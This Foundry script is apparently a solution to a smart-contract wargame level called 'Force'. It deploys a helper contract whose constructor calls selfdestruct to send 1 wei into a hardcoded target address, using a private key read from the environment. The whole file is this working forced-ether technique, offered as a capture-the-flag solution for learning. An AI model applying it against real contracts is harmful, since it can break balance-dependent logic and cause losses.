//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract Intermediary {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}
contract ForceSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Intermediary{value: 1 wei}(payable(0xc989302d886138d292B6E427F765AAD95B91d831));
        vm.stopBroadcast();
    }
}